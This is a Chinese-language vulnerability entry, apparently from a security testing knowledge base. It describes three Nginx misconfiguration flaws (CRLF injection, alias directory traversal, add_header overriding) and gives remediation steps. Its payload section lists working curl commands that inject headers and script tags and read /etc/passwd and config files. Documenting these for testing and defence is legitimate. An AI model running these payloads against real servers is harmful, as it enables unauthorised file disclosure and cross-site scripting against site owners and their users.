---
id: NGINX-INSECURE-CONFIGURATION
title: Nginx 配置错误导致漏洞
product: nginx
vendor: Nginx
version_affected: "任意版本（配置相关）"
severity: MEDIUM
tags: [crlf_injection, path_traversal, xss, 无需认证]
fingerprint: ["Nginx"]
---

## 漏洞描述

Nginx配置错误可能导致三种漏洞：
1. CRLF注入漏洞：Nginx会将`$uri`进行解码，导致传入%0d%0a即可引入换行符
2. 目录穿越漏洞：配置别名（Alias）时忘记加`/`，导致目录穿越
3. add_header覆盖：子块中的`add_header`会覆盖父块的HTTP头，导致安全头失效

## 影响版本

- 任意版本（取决于配置）

## 前置条件

- 无需认证
- 需要目标存在相应配置错误

## 利用步骤

1. 识别目标 Nginx 版本和配置（通过响应头、错误页面等）
2. 测试 CRLF 注入：在 URL 中插入 `%0d%0a` 检查响应头是否被注入
3. 测试目录穿越：尝试 `/files../` 等路径访问上级目录
4. 测试 add_header 覆盖：检查子路径是否丢失安全头（如 CSP、X-Frame-Options）

## Payload

### CRLF注入
```bash
# 注入自定义Cookie
curl -i "http://target:8080/%0d%0aSet-Cookie:%20a=1"

# 注入多个Header（需配合XSS）
curl -i "http://target:8080/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

### 目录穿越
```bash
# 穿越到上级目录读取敏感文件
curl "http://target:8081/files../"
curl "http://target:8081/files../etc/passwd"
curl "http://target:8081/files../var/www/html/config.php"
```

### XSS（通过CRLF注入绕过CSP）
```bash
curl "http://target:8080/%0d%0aSet-Cookie:%20a=<script>alert(document.domain)</script>"
```

## 验证方法

```bash
# CRLF：检查响应头中是否出现注入的 Set-Cookie
curl -sI "http://target:8080/%0d%0aSet-Cookie:%20a=1" | grep -i "Set-Cookie: a=1"

# 目录穿越：检查是否能读取 /etc/passwd
curl -s "http://target:8081/files../etc/passwd" | grep "root:"

# add_header 覆盖：对比父路径和子路径的安全头
curl -sI "http://target:8080/" | grep -i "X-Frame-Options"
curl -sI "http://target:8080/test2/" | grep -i "X-Frame-Options"
# 如果子路径缺少 X-Frame-Options 则存在漏洞
```

## 修复建议

1. 升级 Nginx 至最新版本
2. 对 `$uri` 进行 URL 编码而不是解码
3. 配置别名时注意加 `/`
4. 检查子块不会覆盖安全相关的 HTTP 头
